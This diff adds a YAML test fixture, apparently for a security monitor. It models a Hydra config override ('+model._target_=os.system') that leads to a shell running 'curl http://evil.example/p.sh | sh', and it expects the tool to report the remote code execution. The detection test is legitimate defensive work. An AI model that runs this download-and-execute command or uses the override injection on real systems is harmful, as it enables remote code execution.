@@ -1,0 +1,31 @@
+subjects:
+  bash:
+    session: pid/100:1
+    program: /bin/bash
+    actors: [{id: u1, name: Dev, email: dev@example.com}]
+    device: gpu-1
+    source: probe
+  python:
+    session: pid/101:1
+    parent: bash
+    program: /usr/bin/python3.11
+    actors: [{id: u1, name: Dev}]
+    device: gpu-1
+    source: probe
+  sh:
+    session: pid/102:1
+    parent: python
+    program: /bin/sh
+    actors: [{id: u1, name: Dev}]
+    device: gpu-1
+    source: probe
+observations:
+  - {kind: session_start, subject: bash}
+  - {kind: spawn, subject: python, cmdline: "python3.11 train.py --config-dir /tmp/hydra_cfg --config-name exp +model._target_=os.system"}
+  - {kind: file_read, subject: python, path: /tmp/hydra_cfg/exp.yaml}
+  - {kind: spawn, subject: sh, cmdline: "/bin/sh -c curl http://evil.example/p.sh | sh"}
+expect:
+  action: report
+  reason_contains: "dangerous _target_ override"
+  output_contains: ["Hydra instantiate() RCE"]
+  chain_min: 3
